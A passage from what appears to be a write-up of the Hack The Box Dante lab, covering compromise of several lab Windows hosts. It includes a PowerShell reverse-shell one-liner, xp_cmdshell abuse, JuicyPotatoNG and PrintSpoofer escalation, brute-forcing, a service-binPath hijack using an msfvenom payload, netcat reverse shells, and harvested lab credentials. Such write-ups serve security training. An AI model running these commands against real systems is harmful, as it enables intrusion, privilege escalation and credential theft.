I tried cracking it using Hashcat and John but it was useless, so I used impacket's `mssqlclient` module to login to the SQL shell

```
impacket-mssqlclient sophie@172.16.1.5
```

<figure><img src="../../../.gitbook/assets/image (796).png" alt=""><figcaption></figcaption></figure>

Now, we check our privileges

```
SQL (sophie  dbo@master)> SELECT is_srvrolemember('sysadmin');
```

The query returns `1` meaning we have full control. We can enable `xp_cmdshell` to execute system commands

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Now test for command execution

```
EXEC xp_cmdshell 'whoami';
```

<figure><img src="../../../.gitbook/assets/image (797).png" alt=""><figcaption></figcaption></figure>

Niceee, from here I tried uploading `nc.exe` but it also doesnt work because of permission issues...im tired man. So, I used this one liner to get a reverse shell

```
EXEC xp_cmdshell 'powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.4'',1234);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

<figure><img src="../../../.gitbook/assets/image (798).png" alt=""><figcaption></figcaption></figure>

Boom, callback baby. I got in. But, there was a problem. I tried listing directories for sophie but it seems we were not seeing any folders or files. It must be because we are in a Service Account. Let's check for privileges

```
PS C:\Users\sophie> whoami /all

USER INFORMATION
----------------

User Name                   SID                                                            
=========================== ===============================================================
nt service\mssql$sqlexpress S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT SERVICE\ALL SERVICES              Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We can see `SeImpersonatePrivilege` is here again lol. We can abuse this using `PrintSpoofer.exe` and escalate to SYSTEM but wait...this is an exception.

We are an SA (Service Account) not a User Account. we can't just use PrintSpoofer because it won't work but we can use another tool which is JuicyPotatoNG.exe

<figure><img src="../../../.gitbook/assets/image (803).png" alt=""><figcaption></figcaption></figure>

Using this, we can perform command executions from the SA. Upload this tool on the target and run this

```
.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c type C:\Users\Administrator\flag.txt > C:\out.txt"
```

Basically, we are running the command `whoami` and directing the output to a file because it won't appear just like that.

Verify that the command worked

```
type C:\out.txt
```

<figure><img src="../../../.gitbook/assets/image (804).png" alt=""><figcaption></figcaption></figure>

Nice, it worked. Now we can directly read the flag from `Administrator`'s Desktop folder

```
// Some code
```

```
.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c type C:\Users\Administrator\Desktop\flag.txt > C:\out.txt"
```

flag: `DANTE{Ju1cy_pot4t03s_in_th3_wild}`

***

## <mark style="color:red;">Update the policy!</mark>

### 172.16.1.101 (DANTE-WS02)

```
Nmap scan report for 172.16.1.101
Host is up (0.29s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE    SERVICE        VERSION
21/tcp   open     ftp?
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| fingerprint-strings: 
|   DNSVersionBindReqTCP, RPCCheck: 
|     220-FileZilla Server 0.9.60 beta
|     DANTE-FTP
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|   GenericLines, NULL: 
|     220-FileZilla Server 0.9.60 beta
|     DANTE-FTP
|   GetRequest, HTTPOptions: 
|     220-FileZilla Server 0.9.60 beta
|     DANTE-FTP
|     Syntax error, command unrecognized.
|   Help: 
|     214-The following commands are recognized:
|     ABOR ADAT ALLO APPE AUTH CDUP CLNT CWD 
|     DELE EPRT EPSV FEAT HASH HELP LIST MDTM
|     MFMT MKD MLSD MLST MODE NLST NOOP NOP 
|     OPTS PASS PASV PBSZ PORT PROT PWD QUIT
|     REST RETR RMD RNFR RNTO SITE SIZE STOR
|     STRU SYST TYPE USER XCUP XCWD XMKD XPWD
|     XRMD
|     Have a nice day.
|   RTSPRequest: 
|_    500 Syntax error, command unrecognized.
135/tcp  open     msrpc          Microsoft Windows RPC
139/tcp  open     netbios-ssn    Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds?
2020/tcp filtered xinupageserver
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=3/15%Time=67D50340%P=x86_64-pc-linux-gnu%r(N
SF:ULL,31,"220-FileZilla\x20Server\x200\.9\.60\x20beta\r\n220\x20DANTE-FTP
SF:\r\n")%r(GenericLines,31,"220-FileZilla\x20Server\x200\.9\.60\x20beta\r
SF:\n220\x20DANTE-FTP\r\n")%r(Help,1A7,"214-The\x20following\x20commands\x
SF:20are\x20recognized:\r\n\x20\x20\x20ABOR\x20\x20\x20ADAT\x20\x20\x20ALL
SF:O\x20\x20\x20APPE\x20\x20\x20AUTH\x20\x20\x20CDUP\x20\x20\x20CLNT\x20\x
SF:20\x20CWD\x20\r\n\x20\x20\x20DELE\x20\x20\x20EPRT\x20\x20\x20EPSV\x20\x
SF:20\x20FEAT\x20\x20\x20HASH\x20\x20\x20HELP\x20\x20\x20LIST\x20\x20\x20M
SF:DTM\r\n\x20\x20\x20MFMT\x20\x20\x20MKD\x20\x20\x20\x20MLSD\x20\x20\x20M
SF:LST\x20\x20\x20MODE\x20\x20\x20NLST\x20\x20\x20NOOP\x20\x20\x20NOP\x20\
SF:r\n\x20\x20\x20OPTS\x20\x20\x20PASS\x20\x20\x20PASV\x20\x20\x20PBSZ\x20
SF:\x20\x20PORT\x20\x20\x20PROT\x20\x20\x20PWD\x20\x20\x20\x20QUIT\r\n\x20
SF:\x20\x20REST\x20\x20\x20RETR\x20\x20\x20RMD\x20\x20\x20\x20RNFR\x20\x20
SF:\x20RNTO\x20\x20\x20SITE\x20\x20\x20SIZE\x20\x20\x20STOR\r\n\x20\x20\x2
SF:0STRU\x20\x20\x20SYST\x20\x20\x20TYPE\x20\x20\x20USER\x20\x20\x20XCUP\x
SF:20\x20\x20XCWD\x20\x20\x20XMKD\x20\x20\x20XPWD\r\n\x20\x20\x20XRMD\r\n2
SF:14\x20Have\x20a\x20nice\x20day\.\r\n")%r(GetRequest,5A,"220-FileZilla\x
SF:20Server\x200\.9\.60\x20beta\r\n220\x20DANTE-FTP\r\n500\x20Syntax\x20er
SF:ror,\x20command\x20unrecognized\.\r\n")%r(HTTPOptions,5A,"220-FileZilla
SF:\x20Server\x200\.9\.60\x20beta\r\n220\x20DANTE-FTP\r\n500\x20Syntax\x20
SF:error,\x20command\x20unrecognized\.\r\n")%r(RTSPRequest,29,"500\x20Synt
SF:ax\x20error,\x20command\x20unrecognized\.\r\n")%r(RPCCheck,FE,"220-File
SF:Zilla\x20Server\x200\.9\.60\x20beta\r\n220\x20DANTE-FTP\r\n500\x20Synta
SF:x\x20error,\x20command\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20
SF:command\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20command\x20unre
SF:cognized\.\r\n500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n5
SF:00\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n")%r(DNSVersionB
SF:indReqTCP,FE,"220-FileZilla\x20Server\x200\.9\.60\x20beta\r\n220\x20DAN
SF:TE-FTP\r\n500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n500\x
SF:20Syntax\x20error,\x20command\x20unrecognized\.\r\n500\x20Syntax\x20err
SF:or,\x20command\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20command\
SF:x20unrecognized\.\r\n500\x20Syntax\x20error,\x20command\x20unrecognized
SF:\.\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-WS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:e4:72 (VMware)
| smb2-time: 
|   date: 2025-03-15T04:37:28
|_  start_date: N/A
```

We see here FTP on port `21` has a Filezilla Server version 0.9.60. SMB on ports `139` and `445`.  Also an unidentified service on port `2020`

Let's start by checking the FTP to see if there any exploits for the Filezilla Server

<figure><img src="../../../.gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure>

No directs access exploits. Let's try brue-forcing with the list of credentials we received earlier

<figure><img src="../../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>

Separate them into a wordlist users in `users.txt` and passwords in `passwords2.txt.` We can bruteforce using `hydra`

I tried using `hydra` and also `medusa` to bruteforce but it didn't work, I thought I was blocked for too many attempts...

<figure><img src="../../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>

So, I ended up using Metasploit's built in FTP bruteforce

```
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 auxiliary(scanner/ftp/ftp_login) > set user_file users.txt
msf6 auxiliary(scanner/ftp/ftp_login) > set rhost 172.16.1.101
msf6 auxiliary(scanner/ftp/ftp_login) > set pass_file passwords2.txt
msf6 auxiliary(scanner/ftp/ftp_login) > exploit
```

<figure><img src="../../../.gitbook/assets/image (762).png" alt=""><figcaption></figcaption></figure>

Cool we have a hit on`dharding:WestminsterOrange5`

<figure><img src="../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>

Looking inside there is a file `Remote login.txt`  . Download it on our machine

<figure><img src="../../../.gitbook/assets/image (39) (1).png" alt=""><figcaption></figcaption></figure>

`James` is talking abaout a changed password, maybe this is a hint for the SMB logins?.

Let's move on to the SMB ports

<figure><img src="../../../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>

Based on the previous txt file, we can conclude that the user is possibly the same but the password, `WestminsterOrange5` was changed to a different character/number. Let's modify the password and make a list of different characters.&#x20;

<figure><img src="../../../.gitbook/assets/image (41) (1).png" alt=""><figcaption></figcaption></figure>

Let's use these first and try to bruteforce using `nxc`

```
nxc smb 172.16.1.101 -u dharding -p passwords3.txt
```

<figure><img src="../../../.gitbook/assets/image (42) (1).png" alt=""><figcaption></figcaption></figure>

Nice!! we have a hit on `dharding:WestminsterOrange17`. Let us now enumerate the SMB shares

```
nxc smb 172.16.1.101 -u dharding -p 'WestminsterOrange17' --shares
```

<figure><img src="../../../.gitbook/assets/image (43) (1).png" alt=""><figcaption></figcaption></figure>

Okay so, we enumerated the available shares but it seems `dharding` doesn't have any permissions over the `ADMIN$` and `C$` shares. Let's try to log in directly into dharding's account using `evil-winrm`

```
evil-winrm -i 172.16.1.101 -u dharding -p "WestminsterOrange17"
```

<figure><img src="../../../.gitbook/assets/image (44) (1).png" alt=""><figcaption></figcaption></figure>

Nice, that worked. Let's get the flag in Desktop

24th flag: `DANTE{superB4d_p4ssw0rd_FTW}`

***

## <mark style="color:red;">Single or double quotes</mark>

Upload Winpeas and execute it and tried look for some juicy stuff

<figure><img src="../../../.gitbook/assets/image (756).png" alt=""><figcaption></figcaption></figure>

I found this foreign program which looks kinda out of place, so i had to Google a bit

<figure><img src="../../../.gitbook/assets/image (755).png" alt=""><figcaption></figcaption></figure>

Results show IObit is a free software that scans, manages and deletes software. Interestingg, this could be a hint. Let's look at some available exploits to escalate our privileges

<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>

Found this exploitDB page that mentions the IObit Uninstaller Service has a PE vector in the version 9.5.0.15. Let's check the version on the target machine

```powershell
(Get-Item "C:\Program Files (x86)\IObit\IObit Uninstaller\IObitUninstaler.exe").VersionInfo
```

<figure><img src="../../../.gitbook/assets/image (758).png" alt=""><figcaption></figcaption></figure>

Noice, we have the same version, which means we can replicate the exploit. Now scrolling down the exploitDB page reveals the step to replicate it.

```
Steps to recreate :
=============================

1.  Open CMD and Check for USP vulnerability by typing 	[ wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """ ]
2.  The Vulnerable Service would Show up.
3.  Check the Service Permissions by typing 				[ sc qc IObitUnSvr ]
4.  The command would return.. 

	C:\>sc qc IObitUnSvr
	[SC] QueryServiceConfig SUCCESS
	SERVICE_NAME: IObitUnSvr
			TYPE               : 10  WIN32_OWN_PROCESS
			START_TYPE         : 2   AUTO_START
			ERROR_CONTROL      : 0   IGNORE
			BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
			LOAD_ORDER_GROUP   :
			TAG                : 0
			DISPLAY_NAME       : IObit Uninstaller Service
			DEPENDENCIES       :
			SERVICE_START_NAME : LocalSystem

5.  This concludes that the service is running as SYSTEM. "Highest privilege in a machine"
6.  Now create a Payload with msfvenom or other tools and name it to IObit.exe
7.  Make sure you have write Permissions to "C:\Program Files (x86)\IObit" directory.
8.  Provided that you have right permissions, Drop the IObit.exe executable you created into the "C:\Program Files (x86)\IObit" Directory.
9.  Now restart the IObit Uninstaller service by giving coommand [ sc stop IObitUnSvr ] followed by [ sc start IObitUnSvr ]
10. If your payload is created with msfvenom, quickly migrate to a different process. [Any process since you have the SYSTEM Privilege].
```

```powershell
sc.exe qc IObitUnSvr
```

<figure><img src="../../../.gitbook/assets/image (759).png" alt=""><figcaption></figcaption></figure>

This confirms that SYSTEM is running the service. Now we generate the reverse shell payload using msfvenom

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=1235 -f exe > shell.exe
```

<figure><img src="../../../.gitbook/assets/image (760).png" alt=""><figcaption></figcaption></figure>

Things were going well until Step 7. We have no write access to the directory of `"C:\Program Files (x86)\IObit"` when wanting to transfer our reverse shell payload&#x20;

<figure><img src="../../../.gitbook/assets/image (761).png" alt=""><figcaption></figcaption></figure>

We can check the permissions of our ACL using the `Get-ServiceAcl.ps1` cmdlet Powershell module which lets us see the permissions of users over the provided service

Import the module and filter by the service

```powershell
. .\Get-ServiceAcl.ps1
"IObitUnSvr" | Get-ServiceAcl | Select -ExpandProperty Access
```

<figure><img src="../../../.gitbook/assets/image (763).png" alt=""><figcaption></figcaption></figure>

Now, that we can see the ACLs, we see `dharding` has the permission to change the service configuration. We can exploit this by replacing the current service binary path with the reverse shell payload.

First, we transfer the payload to `dharding`'s home directory like his Desktop folder. Then we change the configuration of the binary path of the IObit service using this:

```powershell
sc.exe config IObitUnSvr binPath= "C:\Users\dharding\Desktop\shell.exe"
```

Verify that it worked

```
sc.exe qc IObitUnSvr
```

<figure><img src="../../../.gitbook/assets/image (764).png" alt=""><figcaption></figcaption></figure>

Nice we changed the binary path of the file. Let's head back to our machine and start a listener in Metasploit to catch the shell and start a Meterpreter

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.4
msf6 exploit(multi/handler) > set lport 1235
msf6 exploit(multi/handler) > exploit
```

Now, in our `dharding` session, we also have the rights to stop and start the service. Let's do that to reload the service.

```powershell
sc.exe stop IObitUnSvr
sc.exe start IObitUnSvr
```

<figure><img src="../../../.gitbook/assets/image (766).png" alt=""><figcaption></figcaption></figure>

Boom, we get SYSTEM session on the meterpreter, though it only lasts for a few seconds before we lose it for some reason, get the flag quickly

```
cat C:/Users/Administrator/Desktop/flag.txt
```

25th flag: `DANTE{Qu0t3_I_4M_secure!_unQu0t3}`

***

## <mark style="color:red;">Congratulations to a perfect pear</mark>

### 176.16.1.102 (DANTE-WS03)

```
Nmap scan report for 172.16.1.102
Host is up (0.29s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
|_http-title: Dante Marriage Registration System :: Home Page
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0
|_ssl-date: TLS randomness does not represent time
|_http-title: Dante Marriage Registration System :: Home Page
| ssl-cert: Subject: commonName=localhost/organizationName=TESTING CERTIFICATE
| Subject Alternative Name: DNS:localhost
| Not valid before: 2022-06-24T01:07:25
|_Not valid after:  2022-12-24T01:07:25
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-03-15T04:37:50+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DANTE-WS03
| Not valid before: 2025-03-14T03:31:05
|_Not valid after:  2025-09-13T03:31:05
| rdp-ntlm-info: 
|   Target_Name: DANTE-WS03
|   NetBIOS_Domain_Name: DANTE-WS03
|   NetBIOS_Computer_Name: DANTE-WS03
|   DNS_Domain_Name: DANTE-WS03
|   DNS_Computer_Name: DANTE-WS03
|   Product_Version: 10.0.19041
|_  System_Time: 2025-03-15T04:37:12+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-15T04:37:30
|_  start_date: N/A
|_nbstat: NetBIOS name: DANTE-WS03, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:b2:0a (VMware)

Post-scan script results:
| clock-skew: 
|   0s: 
|     172.16.1.5
|     172.16.1.17
|     172.16.1.10
|     172.16.1.102
|     172.16.1.101
|     172.16.1.13
|_    172.16.1.20
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (11 hosts up) scanned in 877.76 seconds
```

We can see here were are dealing with a Windows machine with ports HTTP, SMB MYSQL and RDP...this could be a clue on how we could get in and gain access. Let's check the HTTP web server

<figure><img src="../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

A marriage registration system huh...Like previous methods, try to look for some available exploits. I found this one in exploitDB

<figure><img src="../../../.gitbook/assets/image (768).png" alt=""><figcaption></figcaption></figure>

```
possibility of automatic registration and execution of any command without needing to upload any local file
# Example with registration:    python3 script.py -u http://172.16.1.102:80/ -c 'whoami' 
```

The script registers a different phone.no everytime while having the `-c` flag to execute remote commands. Let's try it!

<figure><img src="../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

Nice, from here we can straight up ge the flag

```
python3 marriage.py -u http://172.16.1.102:80/ -c 'type C:\Users\blake\Desktop\flag.txt'
```

<figure><img src="../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

26th flag: `DANTE{U_M4y_Kiss_Th3_Br1d3}`

***

## <mark style="color:red;">MinatoTW strikes again</mark>

Now, to get in, we can upload `nc64.exe` and make a reverse connection back to our machine

```
python3 marriage.py -u http://172.16.1.102:80/ -c 'powershell wget http://10.10.14.4:8000/nc64.exe -o nc64.exe'
```

Verify it worked by listing directories

```
python3 marriage.py -u http://172.16.1.102:80/ -c 'dir'
```

<figure><img src="../../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>

Open a listener and execute the executable to make a callback

```
python3 marriage.py -u http://172.16.1.102:80/ -c 'nc64.exe 10.10.14.4 1234 -e cmd.exe'
```

<figure><img src="../../../.gitbook/assets/image (30) (1).png" alt=""><figcaption></figcaption></figure>

Callback received. Now check for privileges

```
whoami /all
```

<figure><img src="../../../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>

We can see here an easy win because `SeImpersonatePrivilege` is enabled. The `SeImpersonatePrivilege` is a Windows privilege that grants a user or process the ability to impersonate the security context of another user or account. This privilege allows a process to assume the identity of a different user, enabling it to perform actions or access resources as if it were that user.

However, if not properly managed or granted to unauthorized users or processes, the `SeImpersonatePrivilege` can pose a significant security risk. Like here, we can exploit this privilege using PrinSpoofer64.exe

{% embed url="https://github.com/itm4n/PrintSpoofer" %}

Enter a powershell session, Upload it on the target

```
C:\Users\blake\Desktop>powershell
PS C:\Users\blake\Desktop> wget http://10.10.14.4:8000/PrintSpoofer64.exe -o PrintSpoofer64.exe
```

Execute it and spawn a Powershell

```powershell
./PrintSpoofer64.exe -i -c powershell
```

<figure><img src="../../../.gitbook/assets/image (32) (1).png" alt=""><figcaption></figcaption></figure>

Boom, another SYSTEM session. Get the flag in Administrator's Desktop folder

27th flag: `DANTE{D0nt_M3ss_With_MinatoTW}`

***

### Credential Gathering/Harvesting

As of now, I have gathered these credentials of usernames and passwords.

{% tabs %}
{% tab title="users.txt" %}
`asmith`\
`smoggat`\
`tmodle`\
`ccraven`\
`kploty`\
`jbercov`\
`whaguey`\
`dcamtan`\
`tspadly`\
`ematlis`\
`fglacdon`\
`tmentrso`\
`dharding`\
`smillar`\
`bjohnston`\
`iahmed`\
`plongbottom`\
`jcarrot`\
`lgesley`\
`james`\
`balthazar`\
`margaret`\
`frank`\
`ben`\
`egre55`\
`ian`\
`mrb3n`\
`julian`\
`admin`\
`Admin_129834765`
{% endtab %}

{% tab title="passwords.txt" %}
`Princess1`\
`Summer2019`\
`P45678!`\
`Password1`\
`Teacher65`\
`4567Holiday1`\
`acb123`\
`WorldOfWarcraft67`\
`RopeBlackfieldForwardslash`\
`JuneJuly1TY`\
`FinalFantasy7`\
`65RedBalloons`\
`WestminsterOrange17`\
`MarksAndSparks91`\
`Bullingdon1`\
`Sheffield23`\
`PowerfixSaturdayClub777`\
`Tanenbaum0001`\
`SuperStrongCantForget123456789`\
`Toyota`\
`TheJoker12345!`\
`Welcome1!2@3#`\
`TractorHeadtorchDeskmat`\
`Welcometomyblog`\
`egre55`\
`VPN123ZXC`\
`S3kur1ty2020!`\
`manchesterunited`\
`password6543`\
`SamsungOctober102030`
{% endtab %}
{% endtabs %}

